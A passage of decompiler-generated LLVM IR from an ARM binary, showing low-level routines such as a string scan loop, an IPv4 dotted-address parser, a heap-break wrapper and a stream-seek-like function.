  store i32 %v0_1554c, i32* @r0, align 4
  store i32 %v1_15548, i32* @r5, align 4
  %v0_15554 = load i32, i32* @r1, align 4
  store i32 %v0_15554, i32* %r6.global-to-local, align 4
  %v1_15558 = inttoptr i32 %v0_1554c to i8*
  %v2_15558 = call i32 @function_15a48(i8* %v1_15558)
  %v0_1555c = load i32, i32* %r4.global-to-local, align 4
  %v2_1555c = add i32 %v0_1555c, %v2_15558
  %v3_1555c = inttoptr i32 %v2_1555c to i8*
  %v4_1555c = load i8, i8* %v3_1555c, align 1
  %v6_1555c = zext i8 %v4_1555c to i32
  store i32 %v6_1555c, i32* %r3.global-to-local, align 4
  store i32 %v2_1555c, i32* @r4, align 4
  %v2_15564 = icmp eq i8 %v4_1555c, 0
  store i1 %v2_15564, i1* @cpsr_z, align 1
  %v0_15568 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_15568, i32* @r1, align 4
  store i32 %v2_1555c, i32* @r0, align 4
  br i1 %v2_15564, label %bb7, label %dec_label_pc_15578

bb7:                                              ; preds = %dec_label_pc_15540._crit_edge
  %v2_15570 = load i32, i32* @r5, align 4
  %v3_15570 = inttoptr i32 %v2_15570 to i32*
  store i32 %v2_1555c, i32* %v3_15570, align 4
  br label %dec_label_pc_155ac

dec_label_pc_15578:                               ; preds = %dec_label_pc_15540._crit_edge
  %v0_15578 = call i32 @function_155b4()
  store i32 %v0_15578, i32* %r2.global-to-local, align 4
  %v3_1557c = icmp eq i32 %v0_15578, 0
  store i1 %v3_1557c, i1* @cpsr_z, align 1
  br i1 %v3_1557c, label %dec_label_pc_1558c, label %dec_label_pc_1559c

dec_label_pc_1558c:                               ; preds = %dec_label_pc_15578
  %v0_15584 = load i32, i32* @r4, align 4
  %v2_1558c = call i32 @function_15990(i32 %v0_15584, i32 0)
  %v0_15590 = load i32, i32* @r4, align 4
  store i32 %v0_15590, i32* %r3.global-to-local, align 4
  %v1_15594 = load i32, i32* @r5, align 4
  %v2_15594 = inttoptr i32 %v1_15594 to i32*
  store i32 %v2_1558c, i32* %v2_15594, align 4
  br label %dec_label_pc_155ac

dec_label_pc_1559c:                               ; preds = %dec_label_pc_15578
  %v3_155a0 = inttoptr i32 %v0_15578 to i8*
  store i8 0, i8* %v3_155a0, align 1
  %v4_155a0 = load i32, i32* %r2.global-to-local, align 4
  %v5_155a0 = add i32 %v4_155a0, 1
  store i32 %v5_155a0, i32* @r2, align 4
  %v1_155a4 = load i32, i32* @r5, align 4
  %v2_155a4 = inttoptr i32 %v1_155a4 to i32*
  store i32 %v5_155a0, i32* %v2_155a4, align 4
  %v0_155a8 = load i32, i32* @r4, align 4
  store i32 %v0_155a8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_155ac

dec_label_pc_155ac:                               ; preds = %bb7, %dec_label_pc_1558c, %dec_label_pc_1559c
  %v0_155ac = load i32, i32* %r3.global-to-local, align 4
  %v2_155b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_155b0, i32* @r4, align 4
  store i32 %v6_15540, i32* @r5, align 4
  ret i32 %v0_155ac

; uselistorder directives
  uselistorder i32 %v0_1554c, { 1, 0 }
  uselistorder i32 %v0_15544, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_155ac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_15540._crit_edge, { 1, 0 }
}

define i32 @function_155b4() local_unnamed_addr {
dec_label_pc_155b4:
  %v0_155b4 = load i32, i32* @r0, align 4
  %v1_155d82 = inttoptr i32 %v0_155b4 to i8*
  %v2_155d83 = load i8, i8* %v1_155d82, align 1
  %v3_155d84 = zext i8 %v2_155d83 to i32
  %v2_155dc5 = icmp eq i8 %v2_155d83, 0
  br i1 %v2_155dc5, label %dec_label_pc_155d8._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %dec_label_pc_155b4
  %v0_155e4.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_155bc:                               ; preds = %dec_label_pc_155c4
  %v1_155cc = add i32 %v0_155cc, 1
  %v9_155bc = icmp eq i32 %v3_155c4, %v3_155d86
  br i1 %v9_155bc, label %dec_label_pc_155ec, label %dec_label_pc_155c4

dec_label_pc_155c4:                               ; preds = %dec_label_pc_155bc, %bb
  %v0_155cc = phi i32 [ %v1_155cc, %dec_label_pc_155bc ], [ %v0_155e4.pre, %bb ]
  %v1_155c4 = inttoptr i32 %v0_155cc to i8*
  %v2_155c4 = load i8, i8* %v1_155c4, align 1
  %v3_155c4 = zext i8 %v2_155c4 to i32
  store i32 %v3_155c4, i32* @ip, align 4
  %v2_155c8 = icmp eq i8 %v2_155c4, 0
  br i1 %v2_155c8, label %dec_label_pc_155d4, label %dec_label_pc_155bc

dec_label_pc_155d4:                               ; preds = %dec_label_pc_155c4
  %v1_155d4 = add i32 %v0_155d4, 1
  %v1_155d8 = inttoptr i32 %v1_155d4 to i8*
  %v2_155d8 = load i8, i8* %v1_155d8, align 1
  %v3_155d8 = zext i8 %v2_155d8 to i32
  %v2_155dc = icmp eq i8 %v2_155d8, 0
  br i1 %v2_155dc, label %dec_label_pc_155d8._crit_edge, label %bb

dec_label_pc_155d8._crit_edge:                    ; preds = %dec_label_pc_155d4, %dec_label_pc_155b4
  %v3_155d8.lcssa = phi i32 [ %v3_155d84, %dec_label_pc_155b4 ], [ %v3_155d8, %dec_label_pc_155d4 ]
  ret i32 %v3_155d8.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_155d4
  %v0_155d4 = phi i32 [ %v0_155b4, %.lr.ph ], [ %v1_155d4, %dec_label_pc_155d4 ]
  %v3_155d86 = phi i32 [ %v3_155d84, %.lr.ph ], [ %v3_155d8, %dec_label_pc_155d4 ]
  br label %dec_label_pc_155c4

dec_label_pc_155ec:                               ; preds = %dec_label_pc_155bc
  ret i32 %v0_155d4

; uselistorder directives
  uselistorder i32 %v3_155d8, { 1, 0 }
  uselistorder i32 %v3_155c4, { 1, 0 }
  uselistorder i32 %v0_155cc, { 1, 0 }
  uselistorder i32 %v3_155d84, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_155c4, { 1, 0 }
}

define i32 @function_155f4() local_unnamed_addr {
dec_label_pc_155f4:
  %r0.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_155f4 = load i32, i32* @r0, align 4
  %v2_155f4 = icmp eq i32 %v0_155f4, 0
  %v3_155f8 = load i32, i32* @r4, align 4
  store i32 %v3_155f8, i32* %stack_var_-20, align 4
  %v0_155fc = load i32, i32* @r1, align 4
  br i1 %v2_155f4, label %dec_label_pc_156d4, label %dec_label_pc_15610.lr.ph

dec_label_pc_15610:                               ; preds = %dec_label_pc_15610.lr.ph, %dec_label_pc_15694
  %v1_15694 = phi i32 [ 0, %dec_label_pc_15610.lr.ph ], [ %v5_15694, %dec_label_pc_15694 ]
  %v0_15698 = phi i32 [ 1, %dec_label_pc_15610.lr.ph ], [ %v1_15698, %dec_label_pc_15694 ]
  %v0_15618 = phi i32 [ %v0_155f4, %dec_label_pc_15610.lr.ph ], [ %v0_1561825, %dec_label_pc_15694 ]
  store i32 %v2_15614.pre, i32* @lr, align 4
  %v1_15618 = inttoptr i32 %v0_15618 to i8*
  %v2_15618 = load i8, i8* %v1_15618, align 1
  %v3_15618 = zext i8 %v2_15618 to i32
  %v3_1561c = mul nuw nsw i32 %v3_15618, 2
  %v4_1561c = add i32 %v3_1561c, %v2_15614.pre
  %v5_1561c = inttoptr i32 %v4_1561c to i8*
  %v6_1561c = load i8, i8* %v5_1561c, align 1
  %v1_15620 = and i8 %v6_1561c, 8
  %v2_15620 = icmp eq i8 %v1_15620, 0
  br i1 %v2_15620, label %dec_label_pc_156d4, label %dec_label_pc_15628

dec_label_pc_15628:                               ; preds = %dec_label_pc_15610
  br label %dec_label_pc_15648

dec_label_pc_15630:                               ; preds = %dec_label_pc_15648
  %v3_15634 = mul i32 %v0_15694, 10
  %v4_15634 = add i32 %v3_15648, %v3_15634
  %v1_15638 = add i32 %v4_15634, -48
  %v8_15640 = icmp sgt i32 %v1_15638, 255
  br i1 %v8_15640, label %dec_label_pc_156d4, label %dec_label_pc_15644

dec_label_pc_15644:                               ; preds = %dec_label_pc_15630
  %v1_15644 = add i32 %v0_15684, 1
  store i32 %v1_15644, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15648

dec_label_pc_15648:                               ; preds = %dec_label_pc_15628, %dec_label_pc_15644
  %v0_15694 = phi i32 [ 0, %dec_label_pc_15628 ], [ %v1_15638, %dec_label_pc_15644 ]
  %v0_15684 = phi i32 [ %v0_15618, %dec_label_pc_15628 ], [ %v1_15644, %dec_label_pc_15644 ]
  %v1_15648 = inttoptr i32 %v0_15684 to i8*
  %v2_15648 = load i8, i8* %v1_15648, align 1
  %v3_15648 = zext i8 %v2_15648 to i32
  %v2_1564c = mul nuw nsw i32 %v3_15648, 2
  %v2_15650 = add i32 %v2_1564c, %v2_15614.pre
  %v3_15654 = inttoptr i32 %v2_15650 to i8*
  %v4_15654 = load i8, i8* %v3_15654, align 1
  %v6_15654 = zext i8 %v4_15654 to i32
  %v1_15660 = and i32 %v6_15654, 8
  %v2_15660 = icmp eq i32 %v1_15660, 0
  br i1 %v2_15660, label %dec_label_pc_15668, label %dec_label_pc_15630

dec_label_pc_15668:                               ; preds = %dec_label_pc_15648
  %v8_1566c = icmp sgt i32 %v0_15698, 3
  br i1 %v8_1566c, label %dec_label_pc_15680, label %dec_label_pc_15670

dec_label_pc_15670:                               ; preds = %dec_label_pc_15668
  %v7_15670 = icmp eq i8 %v2_15648, 46
  br i1 %v7_15670, label %dec_label_pc_15678, label %dec_label_pc_156d4

dec_label_pc_15678:                               ; preds = %dec_label_pc_15670
  %v1_15678 = add i32 %v0_15684, 1
  store i32 %v1_15678, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15694

dec_label_pc_15680:                               ; preds = %dec_label_pc_15668
  %v2_15680 = icmp eq i8 %v2_15648, 0
  %v1_15684 = add i32 %v0_15684, 1
  store i32 %v1_15684, i32* %r0.global-to-local, align 4
  br i1 %v2_15680, label %dec_label_pc_15694, label %dec_label_pc_1568c

dec_label_pc_1568c:                               ; preds = %dec_label_pc_15680
  %v1_1568c = and i32 %v6_15654, 32
  %v2_1568c = icmp eq i32 %v1_1568c, 0
  br i1 %v2_1568c, label %dec_label_pc_156d4, label %dec_label_pc_15694

dec_label_pc_15694:                               ; preds = %dec_label_pc_1568c, %dec_label_pc_15680, %dec_label_pc_15678
  %v0_1561825 = phi i32 [ %v1_15684, %dec_label_pc_1568c ], [ %v1_15684, %dec_label_pc_15680 ], [ %v1_15678, %dec_label_pc_15678 ]
  %v4_15694 = mul i32 %v1_15694, 256
  %v5_15694 = or i32 %v0_15694, %v4_15694
  %v1_15698 = add nuw nsw i32 %v0_15698, 1
  %v7_156a0 = icmp slt i32 %v1_15698, 5
  br i1 %v7_156a0, label %dec_label_pc_15610, label %dec_label_pc_156a4

dec_label_pc_15610.lr.ph:                         ; preds = %dec_label_pc_155f4
  %v2_15614.pre = load i32, i32* @global_var_20278, align 4
  br label %dec_label_pc_15610

dec_label_pc_156a4:                               ; preds = %dec_label_pc_15694
  %v2_156a4 = icmp eq i32 %v0_155fc, 0
  br i1 %v2_156a4, label %bb, label %bb40

bb:                                               ; preds = %dec_label_pc_156a4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb40:                                             ; preds = %dec_label_pc_156a4
  %v3_156c0 = call i32 @llvm.bswap.i32(i32 %v5_15694)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_156cc = inttoptr i32 %v0_155fc to i32*
  store i32 %v3_156c0, i32* %v3_156cc, align 4
  %v2_156d0.pre = load i32, i32* %stack_var_-20, align 4
  %v17_156d0.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb40
  %v17_156d0 = phi i32 [ 1, %bb ], [ %v17_156d0.pre, %bb40 ]
  %v2_156d0 = phi i32 [ %v3_155f8, %bb ], [ %v2_156d0.pre, %bb40 ]
  store i32 %v2_156d0, i32* @r4, align 4
  ret i32 %v17_156d0

dec_label_pc_156d4:                               ; preds = %dec_label_pc_15670, %dec_label_pc_1568c, %dec_label_pc_15610, %dec_label_pc_15630, %dec_label_pc_155f4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_155f8, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_15614.pre, { 2, 1, 0 }
  uselistorder i32 %v1_15698, { 1, 0 }
  uselistorder i32 %v0_15684, { 0, 1, 3, 2 }
  uselistorder i32 %v3_155f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i32* @global_var_20278, { 0, 1, 3, 2, 4 }
  uselistorder i32 5, { 6, 4, 9, 5, 0, 10, 11, 7, 1, 2, 12, 13, 14, 8, 3, 15, 16 }
  uselistorder i32 -48, { 2, 3, 4, 1, 0 }
  uselistorder i32 10, { 8, 22, 9, 23, 24, 10, 25, 11, 12, 0, 3, 4, 13, 21, 26, 27, 6, 15, 14, 28, 29, 7, 30, 2, 1, 31, 16, 5, 18, 19, 17, 20, 32 }
  uselistorder i8 8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_156d4, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_15648, { 1, 0 }
}

define i32 @function_156e0(i32 %arg1) local_unnamed_addr {
dec_label_pc_156e0:
  %v3_156e0 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_156e8 = call i32 @function_10724()
  %v0_156ec = load i32, i32* @r4, align 4
  store i32 %v3_156e0, i32* @r4, align 4
  %v2_156f4 = call i32 @function_107cc(i32 %v0_156e8, i32 %v0_156ec)
  ret i32 %v2_156f4

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_107cc, { 2, 1, 0 }
  uselistorder i32 ()* @function_10724, { 0, 3, 2, 1 }
}

define i32 @function_156f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_156f8:
  %v1_156f8 = add i32 %arg1, 28
  %v2_156f8 = inttoptr i32 %v1_156f8 to i32*
  %v3_156f8 = load i32, i32* %v2_156f8, align 4
  %v1_15700 = add i32 %arg1, 44
  %v2_15700 = inttoptr i32 %v1_15700 to i32*
  %v3_15700 = load i32, i32* %v2_15700, align 4
  store i32 %v3_156f8, i32* @global_var_266f0.426, align 4
  store i32 %v3_15700, i32* @global_var_266f4.428, align 4
  ret i32 %arg1
}

define i32 @function_1571c(i32* %arg1) local_unnamed_addr {
dec_label_pc_1571c:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_15724 = call i32 @brk(i32* %arg1)
  %v3_15728 = icmp ult i32 %v2_15724, %tmp
  store i32 %v2_15724, i32* @global_var_26648.404, align 4
  br i1 %v3_15728, label %dec_label_pc_1573c, label %dec_label_pc_1574c

dec_label_pc_1573c:                               ; preds = %dec_label_pc_1571c
  %v0_1573c = call i32 @function_10a18()
  %v2_15744 = inttoptr i32 %v0_1573c to i32*
  store i32 12, i32* %v2_15744, align 4
  br label %dec_label_pc_1574c

dec_label_pc_1574c:                               ; preds = %dec_label_pc_1571c, %dec_label_pc_1573c
  %v0_1574c = phi i32 [ 0, %dec_label_pc_1571c ], [ -1, %dec_label_pc_1573c ]
  ret i32 %v0_1574c

; uselistorder directives
  uselistorder i32* @global_var_26648.404, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1574c, { 1, 0 }
}

define i32 @function_15758() local_unnamed_addr {
dec_label_pc_15758:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v0_15758 = load i32, i32* @r2, align 4
  store i32 %v0_15758, i32* %r3.global-to-local, align 4
  %v0_1575c = load i32, i32* @r1, align 4
  %v3_1575c = ashr i32 %v0_1575c, 31
  store i32 %v3_1575c, i32* %r2.global-to-local, align 4
  %v3_15764 = load i32, i32* @r4, align 4
  %v6_15764 = load i32, i32* @r5, align 4
  %v9_15764 = load i32, i32* @r6, align 4
  %v2_1576c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v0_15758, i32* @r6, align 4
  %v0_15774 = load i32, i32* @r0, align 4
  store i32 %v0_15774, i32* @r5, align 4
  %tmp = icmp ult i32 %v0_15758, 3
  br i1 %tmp, label %dec_label_pc_15790, label %dec_label_pc_1577c

dec_label_pc_1577c:                               ; preds = %dec_label_pc_15758
  %v0_1577c = call i32 @function_10a18()
  store i32 %v0_1577c, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  store i32 22, i32* %r3.global-to-local, align 4
  %v2_15788 = inttoptr i32 %v0_1577c to i32*
  store i32 22, i32* %v2_15788, align 4
  br label %.thread3

dec_label_pc_15790:                               ; preds = %dec_label_pc_15758
  %v1_15790 = add i32 %v0_15774, 52
  %v2_15790 = inttoptr i32 %v1_15790 to i32*
  %v3_15790 = load i32, i32* %v2_15790, align 4
  store i32 %v3_15790, i32* %r7.global-to-local, align 4
  %v2_15794 = icmp eq i32 %v3_15790, 0
  store i32 %v0_1575c, i32* %stack_var_-28, align 4
  br i1 %v2_15794, label %dec_label_pc_157a4, label %dec_label_pc_157d0

dec_label_pc_157a4:                               ; preds = %dec_label_pc_15790
  %v1_157a4 = add i32 %v0_15774, 56
  store i32 %v1_157a4, i32* @r4, align 4
  store i32 80572, i32* %r3.global-to-local, align 4
  store i32 %v2_1576c, i32* @r0, align 4
  store i32 %v1_157a4, i32* %r2.global-to-local, align 4
  %v8_157bc = call i32 @function_13abc(i32 %v2_1576c, i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32 %v1_157a4, i32 80572, i32 %v0_1575c, i32 %v3_1575c, i32 %v3_15764)
  %v0_157c0 = load i32, i32* @r4, align 4
  store i32 %v0_157c0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_13ab4.226 to i32), i32* %r3.global-to-local, align 4
  store i32 88016, i32* @lr, align 4
  %v1_157cc = call i32 @function_13ab4()
  store i32 %v1_157cc, i32* %r0.global-to-local, align 4
  %v0_157d0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_157d0

dec_label_pc_157d0:                               ; preds = %dec_label_pc_15790, %dec_label_pc_157a4
  %v0_157dc = phi i32 [ %v0_15774, %dec_label_pc_15790 ], [ %v0_157d0.pre, %dec_label_pc_157a4 ]
  %v1_157d0 = inttoptr i32 %v0_157dc to i8*
  %v2_157d0 = load i8, i8* %v1_157d0, align 1
  %v3_157d0 = zext i8 %v2_157d0 to i32
  store i32 %v3_157d0, i32* %r3.global-to-local, align 4
  %v1_157d4 = and i32 %v3_157d0, 64
  %v2_157d4 = icmp eq i32 %v1_157d4, 0
  br i1 %v2_157d4, label %dec_label_pc_157ec, label %dec_label_pc_157dc

dec_label_pc_157dc:                               ; preds = %dec_label_pc_157d0
  store i32 %v0_157dc, i32* %r0.global-to-local, align 4
  %v1_157e0 = call i32 @function_10c4c(i32 %v0_157dc)
  store i32 %v1_157e0, i32* %r0.global-to-local, align 4
  %v2_157e4 = icmp eq i32 %v1_157e0, 0
  br i1 %v2_157e4, label %dec_label_pc_157ec, label %dec_label_pc_1585c

dec_label_pc_157ec:                               ; preds = %dec_label_pc_157dc, %dec_label_pc_157d0
  %v0_157ec = load i32, i32* @r6, align 4
  %v7_157ec = icmp eq i32 %v0_157ec, 1
  br i1 %v7_157ec, label %dec_label_pc_157f4, label %dec_label_pc_157ec.dec_label_pc_15808_crit_edge

dec_label_pc_157ec.dec_label_pc_15808_crit_edge:  ; preds = %dec_label_pc_157ec
  br label %dec_label_pc_15808

dec_label_pc_157f4:                               ; preds = %dec_label_pc_157ec
  %v0_157f4 = load i32, i32* @r5, align 4
  store i32 %v0_157f4, i32* %r0.global-to-local, align 4
  %v2_157f8 = ptrtoint i32* %stack_var_-28 to i32
  %v2_157fc = inttoptr i32 %v0_157f4 to i8*
  %v3_157fc = call i32 @function_15894(i8* %v2_157fc, i32 %v2_157f8)
  store i32 %v3_157fc, i32* %r0.global-to-local, align 4
  %v1_15800 = icmp slt i32 %v3_157fc, 0
  br i1 %v1_15800, label %dec_label_pc_1585c, label %dec_label_pc_157f4.dec_label_pc_15808_crit_edge

dec_label_pc_157f4.dec_label_pc_15808_crit_edge:  ; preds = %dec_label_pc_157f4
  %v0_15808.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_15808

dec_label_pc_15808:                               ; preds = %dec_label_pc_157ec.dec_label_pc_15808_crit_edge, %dec_label_pc_157f4.dec_label_pc_15808_crit_edge
  %v0_15808 = phi i32 [ %v0_157ec, %dec_label_pc_157ec.dec_label_pc_15808_crit_edge ], [ %v0_15808.pre, %dec_label_pc_157f4.dec_label_pc_15808_crit_edge ]
  store i32 %v0_15808, i32* %r2.global-to-local, align 4
  %v0_1580c = load i32, i32* @r5, align 4
  store i32 %v0_1580c, i32* %r0.global-to-local, align 4
  %v4_15814 = call i32 @function_15960(i32 %v0_1580c, i32* nonnull %stack_var_-28, i32 %v0_15808)
  store i32 %v4_15814, i32* %r0.global-to-local, align 4
  %v1_15818 = icmp slt i32 %v4_15814, 0
  br i1 %v1_15818, label %dec_label_pc_1585c, label %dec_label_pc_15820

dec_label_pc_15820:                               ; preds = %dec_label_pc_15808
  %v0_15820 = load i32, i32* @r5, align 4
  %v1_15820 = inttoptr i32 %v0_15820 to i32*
  %v2_15820 = load i32, i32* %v1_15820, align 4
  store i32 %v2_15820, i32* %r3.global-to-local, align 4
  %v1_15824 = add i32 %v0_15820, 8
  %v2_15824 = inttoptr i32 %v1_15824 to i32*
  %v3_15824 = load i32, i32* %v2_15824, align 4
  store i32 %v3_15824, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1582c = and i32 %v2_15820, -72
  store i32 %v1_1582c, i32* %r3.global-to-local, align 4
  %v3_15830 = sdiv i32 %v2_15820, 256
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15838 = trunc i32 %v3_15830 to i8
  %v3_15838 = add i32 %v0_15820, 1
  %v4_15838 = inttoptr i32 %v3_15838 to i8*
  store i8 %v1_15838, i8* %v4_15838, align 1
  %v0_1583c = load i32, i32* %r2.global-to-local, align 4
  %v1_1583c = load i32, i32* @r5, align 4
  %v2_1583c = add i32 %v1_1583c, 28
  %v3_1583c = inttoptr i32 %v2_1583c to i32*
  store i32 %v0_1583c, i32* %v3_1583c, align 4
  %v0_15840 = load i32, i32* %r0.global-to-local, align 4
  %v1_15840 = trunc i32 %v0_15840 to i8
  %v2_15840 = load i32, i32* @r5, align 4
  %v3_15840 = add i32 %v2_15840, 2
  %v4_15840 = inttoptr i32 %v3_15840 to i8*
  store i8 %v1_15840, i8* %v4_15840, align 1
  %v0_15844 = load i32, i32* %r3.global-to-local, align 4
  %v1_15844 = trunc i32 %v0_15844 to i8
  %v2_15844 = load i32, i32* @r5, align 4
  %v3_15844 = inttoptr i32 %v2_15844 to i8*
  store i8 %v1_15844, i8* %v3_15844, align 1
  %v0_15848 = load i32, i32* %r2.global-to-local, align 4
  %v1_15848 = load i32, i32* @r5, align 4
  %v2_15848 = add i32 %v1_15848, 16
  %v3_15848 = inttoptr i32 %v2_15848 to i32*
  store i32 %v0_15848, i32* %v3_15848, align 4
  %v0_1584c = load i32, i32* %r2.global-to-local, align 4
  %v1_1584c = load i32, i32* @r5, align 4
  %v2_1584c = add i32 %v1_1584c, 20
  %v3_1584c = inttoptr i32 %v2_1584c to i32*
  store i32 %v0_1584c, i32* %v3_1584c, align 4
  %v0_15850 = load i32, i32* %r2.global-to-local, align 4
  %v1_15850 = load i32, i32* @r5, align 4
  %v2_15850 = add i32 %v1_15850, 24
  %v3_15850 = inttoptr i32 %v2_15850 to i32*
  store i32 %v0_15850, i32* %v3_15850, align 4
  %v0_15854 = load i32, i32* %r0.global-to-local, align 4
  %v1_15854 = load i32, i32* @r5, align 4
  %v2_15854 = add i32 %v1_15854, 44
  %v3_15854 = inttoptr i32 %v2_15854 to i32*
  store i32 %v0_15854, i32* %v3_15854, align 4
  br label %dec_label_pc_15860

dec_label_pc_1585c:                               ; preds = %dec_label_pc_157dc, %dec_label_pc_15808, %dec_label_pc_157f4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_15860

dec_label_pc_15860:                               ; preds = %dec_label_pc_15820, %dec_label_pc_1585c
  %v0_15860 = load i32, i32* %r7.global-to-local, align 4
  %v2_15860 = icmp eq i32 %v0_15860, 0
  br i1 %v2_15860, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_15860
  store i32 %v2_1576c, i32* %r0.global-to-local, align 4
  store i32 80572, i32* %r3.global-to-local, align 4
  store i32 88184, i32* @lr, align 4
  call void @__pseudo_branch(i32 80572)
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_15860, %dec_label_pc_1577c, %bb
  %v0_15878 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15878, i32* %r0.global-to-local, align 4
  store i32 %v3_15764, i32* @r4, align 4
  store i32 %v6_15764, i32* @r5, align 4
  store i32 %v9_15764, i32* @r6, align 4
  ret i32 %v0_15878

; uselistorder directives
  uselistorder i32 %v0_15808, { 1, 0 }
  uselistorder i32 %v0_157dc, { 1, 0, 2 }
  uselistorder i32 %v1_157a4, { 1, 0, 2 }
  uselistorder i32 %v2_1576c, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 5, 6, 1, 7, 13, 8, 11, 9, 0, 10, 12 }
  uselistorder i32 24, { 21, 0, 22, 18, 33, 1, 23, 24, 25, 26, 27, 28, 19, 20, 29, 30, 31, 32, 2, 3, 15, 13, 14, 11, 12, 9, 10, 8, 6, 7, 16, 4, 5, 17 }
  uselistorder i32 28, { 6, 19, 1, 7, 2, 8, 9, 10, 11, 12, 13, 14, 0, 15, 5, 16, 17, 3, 4, 18 }
  uselistorder i32 (i32)* @function_10c4c, { 4, 1, 0, 3, 2 }
  uselistorder i32 ()* @function_13ab4, { 19, 4, 16, 15, 3, 2, 1, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 18, 20, 17 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_13abc, { 8, 1, 0, 5, 4, 3, 2, 7, 6 }
  uselistorder i32 ptrtoint (i32* @global_var_13ab4.226 to i32), { 6, 3, 0, 4, 5, 1, 7, 2 }
  uselistorder i32 80572, { 0, 7, 3, 8, 5, 4, 6, 9, 10, 11, 1, 12, 2, 13 }
  uselistorder i32 56, { 2, 3, 1, 0, 4 }
  uselistorder i32 22, { 2, 10, 3, 4, 9, 5, 6, 11, 7, 12, 8, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15860, { 1, 0 }
  uselistorder label %dec_label_pc_1585c, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15808, { 1, 0 }
  uselistorder label %dec_label_pc_157d0, { 1, 0 }
}

define i32 @function_15894(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15894:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_15894 = load i32, i32* @r4, align 4
  store i32 %v3_15894, i32* %stack_var_-16, align 4
  %v2_15898 = add i32 %tmp, 1
  %v3_15898 = inttoptr i32 %v2_15898 to i8*
  %v4_15898 = load i8, i8* %v3_15898, align 1
  %v5_15898 = zext i8 %v4_15898 to i32
  %v3_1589c = load i8, i8* %arg1, align 1
  %v4_1589c = zext i8 %v3_1589c to i32
  store i32 %v4_1589c, i32* %r2.global-to-local, align 4
  %v4_158a0 = mul nuw nsw i32 %v5_15898, 256
  %v5_158a0 = or i32 %v4_1589c, %v4_158a0
  store i32 %v5_158a0, i32* @lr, align 4
  %tmp15 = urem i8 %v3_1589c, 4
  %v2_158a4 = icmp eq i8 %tmp15, 0
  store i32 %arg2, i32* %r6.global-to-local, align 4
  br i1 %v2_158a4, label %bb, label %dec_label_pc_158b4

bb:                                               ; preds = %dec_label_pc_15894
  br label %.thread

dec_label_pc_158b4:                               ; preds = %dec_label_pc_15894
  %v1_158a4 = zext i8 %tmp15 to i32
  %v1_158b4 = add nsw i32 %v1_158a4, -1
  %v7_158b4 = icmp eq i8 %tmp15, 1
  br i1 %v7_158b4, label %.thread, label %dec_label_pc_158bc

dec_label_pc_158bc:                               ; preds = %dec_label_pc_158b4
  %v1_158bc = and i32 %v4_158a0, 2048
  %v2_158bc = icmp eq i32 %v1_158bc, 0
  br i1 %v2_158bc, label %.thread, label %dec_label_pc_158c4

dec_label_pc_158c4:                               ; preds = %dec_label_pc_158bc
  %v8_158c8 = icmp sgt i32 %v1_158b4, 1
  br i1 %v8_158c8, label %dec_label_pc_15954, label %dec_label_pc_158cc

dec_label_pc_158cc:                               ; preds = %dec_label_pc_158c4
  %v2_158cc = add i32 %tmp, 40
